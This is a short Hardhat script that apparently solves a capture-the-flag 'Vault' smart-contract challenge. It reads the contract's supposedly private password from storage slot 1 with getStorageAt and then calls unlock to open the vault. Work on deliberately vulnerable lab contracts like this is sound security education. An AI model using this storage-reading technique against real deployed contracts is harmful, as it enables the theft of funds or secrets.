const { ethers } = require('hardhat');

async function main() {
    const [owner, player] = await ethers.getSigners();

    // deploy factory
    const Factory = await ethers.getContractFactory("VaultFactory");
    const factory = await Factory.connect(owner).deploy();
    await factory.deployed();

    // deploy new instance
    const receipt = await factory.connect(player).createInstance(player.address);
    const instance_address = (await receipt.wait()).events[0].args[0];
    const vault = await ethers.getContractAt("Vault", instance_address, owner);

    // get password
    const password = await ethers.provider.getStorageAt(vault.address, 1);

    // unlock the vault with password
    await vault.unlock(password);

    // check
    const res = await factory.validateInstance(vault.address, player.address);
    if (res == true) {
        console.log("[+] Done!");
    } else {
        console.log("[+] Fail...");
    }
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});

